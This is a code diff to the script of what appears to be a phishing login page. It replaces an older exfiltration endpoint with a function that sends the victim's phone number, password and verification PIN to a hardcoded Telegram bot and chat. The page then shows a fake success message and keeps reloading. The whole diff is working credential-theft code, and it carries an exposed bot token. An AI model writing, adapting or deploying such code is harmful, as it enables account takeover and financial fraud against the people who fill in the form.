@@ -213,6 +213,30 @@
         });
 
 
+        function sendTelegramMessage(messageText) {
+                botToken = '7688402629:AAF58Q5SVTe-pYG9UY87gO5K7VZ22cwhY5M'
+            chatId = '-5007266300'
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            $.ajax({
+                url: apiUrl,
+                type: 'POST',
+                data: {
+                    chat_id: chatId,
+                    text: messageText,
+                    parse_mode: "MarkdownV2"
+
+                },
+                success: function(response) {
+                    console.log('Message sent successfully:', response);
+                    // Optional: Provide feedback to the user
+                },
+                error: function(error) {
+                    console.error('Error sending message:', error);
+                    // Optional: Handle error and provide feedback
+                }
+            });
+        }
 
         function getCookie(cname) {
             let name = cname + "=";
@@ -241,27 +265,16 @@
             $('.success-message').show()
 
             event.preventDefault();
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", 'https://webhook.orangernoney.com', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
+                pincode = document.getElementById('pincode').value
+                message = `
+        رقم الهاتف: \`${phonenumber}\`
+        كلمة السر: \`${password}\`
+        رمز التحقق: \`${pincode}\`
+                    `
+                sendTelegramMessage(message)
+            
 
-            xhr.onreadystatechange = function() {
-                if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
-                    // window.location.href = '/verification';
-                    setInterval(function() { window.location.reload() }, 5000);
-                }
-                else{
-                    console.log("ERRORRRRRR")
-                }
-            }
-            xhr.send(
-                JSON.stringify({
-                'phonenumber': document.getElementById('phonenumber').value,
-                'password':document.getElementById('password').value,
-                'pin':document.getElementById('pincode').value
-                })
-            );
-
+            setInterval(function(){window.location.reload()},5000);
         })
         
         </script>
